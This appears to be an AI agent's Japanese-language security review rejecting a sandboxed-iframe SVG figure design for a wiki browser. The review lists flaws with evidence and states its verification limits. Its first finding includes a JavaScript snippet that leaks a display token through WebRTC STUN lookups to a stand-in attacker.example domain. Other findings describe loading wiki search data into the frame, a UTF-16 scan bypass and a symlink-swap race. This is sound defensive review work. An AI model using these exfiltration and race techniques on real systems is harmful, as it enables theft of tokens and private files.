## 判定

**却下。確信度：高。** 枠内で任意のスクリプトが動いても外へ送れず、wiki の情報にも届かないという保証が成立していません。SVG をバイト列のまま書き出す変更にも、既存の公開前検査をすり抜ける反例があります。

## 致命的・重大な欠陥

1. **【致命】CSP と sandbox は、WebRTC による外部送信を閉じていない。**

   7.5 節は fetch、画像、フォームを止めることから「表示トークンを外へ出せない」と結論しています。しかし、7.2 節の CSP に WebRTC を制限する指定はありません。`default-src 'none'` は WebRTC の禁止にはなりません。[CSP3 の WebRTC 接続判定](https://www.w3.org/TR/CSP3/#should-block-rtc-connection)は、通常の fetch の判定とは別です。

   枠内の任意スクリプト実行を仮定すると、次が反例候補です。攻撃者の管理するドメインを ICE サーバーに指定し、表示トークンを DNS 名に埋め込みます。

   ```js
   const token = location.pathname.split("/")[1];
   const hex = [...token]
     .map(c => c.charCodeAt(0).toString(16).padStart(2, "0")).join("");
   const host = hex.match(/.{1,40}/g).join(".") + ".attacker.example";

   const pc = new RTCPeerConnection({
     iceServers: [{ urls: "stun:" + host + ":3478" }]
   });
   pc.createDataChannel("x");
   await pc.setLocalDescription(await pc.createOffer());
   ```

   WebRTC が利用可能で DNS 解決が行われる環境では、接続完了前に情報が外へ出ます。親の `frame-src` はこの通信を制限しません。W3C の[情報流出に関する議論](https://github.com/w3c/webappsec/issues/656)にも、ICE サーバー名による DNS 流出が記録されています。

   **検証範囲：** 仕様と設定の欠落は確認済みです。対象の 5 ブラウザで上記 DNS 送信は実測していないため、各ブラウザでの成立は推測です。PoC の `context.route("**/*")` による HTTP 要求の集計では、この経路の不在は証明できません。

   **根拠：** 設計 7.2・7.5、[setup.py:24](C:/Works/info-hive-dev/.claude/worktrees/browse-figures/poc/browse-figures/setup.py:24)、[test.mjs:104](C:/Works/info-hive-dev/.claude/worktrees/browse-figures/poc/browse-figures/test.mjs:104)。

2. **【重大】枠は、送られた図以外の wiki の情報を classic script として取得できる。表示トークンを親の表示に持ち出すこともできる。**

   枠の `script-src` は配信元全体を許します。同じ配信元には、wiki の検索情報を実行可能な JavaScript として返す `data/search.js` があります。枠内の任意スクリプトは次を読み込めます。

   ```js
   const s = document.createElement("script");
   s.src = new URL("../data/search.js", location.href);
   s.onload = () => {
     // window.WIKI_SEARCH に全ページの題、要約、タグ、見出しなどが入る
   };
   document.head.appendChild(s);
   ```

   URL の表示トークンは枠自身が持ち、サーバーはこのファイルを `text/javascript` で返します。不透明なオリジンによる親 DOM の遮断は、許可された classic script の読み込みを遮断しません。「枠へ送るのは図のソースと配色だけ」は、枠が取得できる情報の上限になっていません。

   また、正しい `seq`・`id` と小さな SVG を返し、その `<text>` と `title` に表示トークンを入れるだけで、親は画像の `src` と `alt` に転記します。**実際の `figures.js` をメモリ内の DOM 模型で動かし、トークンが両方に入ることを確認しました。** `setAttribute` は HTML 注入を防ぎますが、秘密の持ち出しや、偽の警告・操作指示を表示することは防ぎません。

   **根拠：** 設計 7.2・7.3・7.5、[wiki_browse.py:476](C:/Works/info-hive-dev/.claude/worktrees/browse-figures/info-hive-wiki/skills/info-hive/scripts/wiki_browse.py:476)、[wiki_browse_core.py:1547](C:/Works/info-hive-dev/.claude/worktrees/browse-figures/info-hive-wiki/skills/info-hive/scripts/wiki_browse_core.py:1547)、同 `render_data`、[figures.js:153](C:/Works/info-hive-dev/.claude/worktrees/browse-figures/poc/browse-figures/src/figures.js:153)。

3. **【重大】UTF-16 の SVG では、公開前の絶対パス・トークン検査が黙って抜ける。**

   6.2 節は SVG を decode せず保存し、6.5 節は公開前検査を「今と同じく」適用するとしています。しかし `scan_machine_info` は、バイト列を常に UTF-8 として decode します。

   BOM 付き UTF-16 の SVG に絶対パスやトークンを含めると、文字間に NUL が残り、検索文字列に一致しません。既存関数を直接呼んだ結果は次のとおりでした。

   ```text
   UTF-8  : [('a.svg', 'path'), ('a.svg', 'token')]
   UTF-16 : []
   ```

   SVG は UTF-16 の XML として有効です。従来は UTF-8 として読めなかった入力が出力から外れましたが、提案では元のバイト列がそのまま書き出されます。したがって、機械の情報を含む出力を、警告なしで持ち出せます。検査がもともと警告だけで書き出しを止めない点は承知しています。失われるのは、その警告です。

   **根拠：** 設計 6.2・6.5、[wiki_browse_core.py:1675](C:/Works/info-hive-dev/.claude/worktrees/browse-figures/info-hive-wiki/skills/info-hive/scripts/wiki_browse_core.py:1675)。

4. **【重大】走査時だけのリンク判定では、「リンクの SVG を読まない」と 2 MiB 上限を保証できない。**

   仮定は、読み取り中に別プロセスが `assets/` を変更できることです。これは既存の 2 回の走査が扱っている状況です。

   再現する操作順は次です。

   1. 最初の走査では、小さな通常ファイル `assets/x.svg` を見せる。
   2. 読む直前に、その名前を wiki 外のファイルへのシンボリックリンクに替える。
   3. 読み終わったら、元の通常ファイルを元の名前へ戻す。
   4. 2 回目の走査は、最初と同じサイズ・更新時刻を返す。

   既存の `read_input`／`open_read` はリンクをたどります。2 回の比較対象には、読み取ったハンドルの種類や識別子がありません。この順なら、外の中身を読んでも写しは採用されます。走査を同じ値に固定し、読む口だけ別のバイト列を返すメモリ内の検証でも、写しが採用されることを確認しました。

   同様に、走査で見たサイズが小さければ、読む瞬間に大きなファイルへ替えられます。既存の `read_file` は EOF まで無制限に読みます。6.2 節のサイズ検査は、実際に読むバイト数の上限にはなりません。

   **根拠：** 設計 6.1・6.2、[wiki_browse_core.py:157](C:/Works/info-hive-dev/.claude/worktrees/browse-figures/info-hive-wiki/skills/info-hive/scripts/wiki_browse_core.py:157)、[wiki_browse_fs.py:200](C:/Works/info-hive-dev/.claude/worktrees/browse-figures/info-hive-wiki/skills/info-hive/scripts/wiki_browse_fs.py:200)、同 `read_file`・`read_input`。新しい SVG 読み取り境界の実装は、まだ存在しません。

## 崩れる前提

- **「不透明なオリジンなら wiki の情報を取得できない」**  
  配信元の classic script を許し、その配信元が wiki の情報を JavaScript で返すと崩れます。

- **「型の合った画像と `alt` だけなら、秘密も偽の指示も親へ持ち出せない」**  
  侵害された枠が SVG の文字と題を自由に返せると崩れます。型の検査は、内容の信頼性を検査していません。

- **「走査前後の一覧が同じなら、安全な入力を読んだ」**  
  読む間だけファイルやディレクトリを替え、走査前に戻すと崩れます。

- **「元のバイト列を保っても、公開前検査の能力は変わらない」**  
  UTF-8 以外の XML を出力に含めると崩れます。

## 見落としと軽微な問題

- **【軽微】`figure_target` と lint は、文字参照で食い違います。**  
  `concepts/page.md` に `![a](../assets/a&amp;b.svg)` と書くと、実際の markdown-it は `src="../assets/a&b.svg"` を返します。一方、`missing_assets` は `a&amp;b.svg` を探します。`assets/a&b.svg` だけが存在する状態を模型で再現すると、lint は不足を報告しました。提案の browse では表示できるのに、lint では不正になります。  
  根拠：[wiki_lint.py:273](C:/Works/info-hive-dev/.claude/worktrees/browse-figures/info-hive-wiki/skills/info-hive/scripts/wiki_lint.py:273)、設計 6.4。

- **【軽微】「親と枠の CSP 違反 0 件」という試験条件は、外部画像のケースで PoC と一致しません。**  
  保存済みの `*-server-framenometa.json` では、5 ブラウザとも枠内に `img-src https://example.com/x.png` が 1 件あります。親の 0 件とは区別が必要です。設計 10.2 の無条件な「親と枠の 0 件」は、この入力と両立しません。

- **【軽微】PoC の通常の実行手順は、採用した WebKit 向け構成を選びません。**  
  `test.mjs` の既定は `FRAME=self` で、CSP の `<meta>` がある枠を使います。記録の成功結果は `FRAME=nometa` です。README の通常手順には、その指定がありません。

- **【軽微】PoC の SHA-256 照合は無効です。**  
  `setup.py` の `TINY_SHA256` は `None` のままで、任意の入力を受け付けます。冒頭の「SHA-256 を照らしてから写す」という説明とは一致しません。

## 検証した事実

| 主張 | 結果 |
| --- | --- |
| `signature_of` と 2 回の走査は同じ入力一覧を使う | 一致。比較要素は種類・パス・サイズ・更新時刻 |
| `assets/wiki/…` がページ出力と衝突しない | 確認した例では一致。`assets/`・`Assets/` のページ側ディレクトリに接尾辞が付く |
| `fs.build` が SVG の bytes と追加の階層を扱える | 一覧生成のコードでは一致。拡張子の制限はない |
| `_machine_needles` が追加の入力種別を走査できる | 一致。ただし読み取った瞬間の実体は記録せず、後でパスを解決する |
| 公開前検査が UTF-16 の秘密を検出する | 食い違い。直接実行で未検出 |
| PoC が親の CSP 違反 0 件を記録している | 保存済み結果と一致。枠内は 1 件 |
| ADR-0016 が描画全般の一致を要求している | 食い違い。本文で列挙されているのはリンク移動・被リンク・診断。設計と ADR-0030 の要約は、それより広い |
| 新しい SVG 走査・写し・配信が既存処理と統合済み | 確かめられず。対象は設計と PoC であり、統合実装は未着手 |

ファイルは変更していません。ブラウザ試験は再実行せず、保存済み結果を照合しました。

## 崩せなかった点

- SVG の文字列を親の DOM に挿入せず、`<img>` の `data:` にする処理から、親でのスクリプト実行は崩せませんでした。
- `alt` の `setAttribute` から、HTML 属性の脱出は崩せませんでした。
- 親 DOM・cookie・localStorage への直接アクセスを、不透明なオリジンの枠から突破する経路は見つかりませんでした。
- 枠自身の外部への移動について、親の `frame-src 'self'` を突破する具体的な経路は見つかりませんでした。
- Mermaid を静的版で描かない決定そのものが、ADR-0016 の列挙した一致条件を破る反例は見つかりませんでした。

使用した MCP サーバー: なし  
使用した Agent Skills: なし
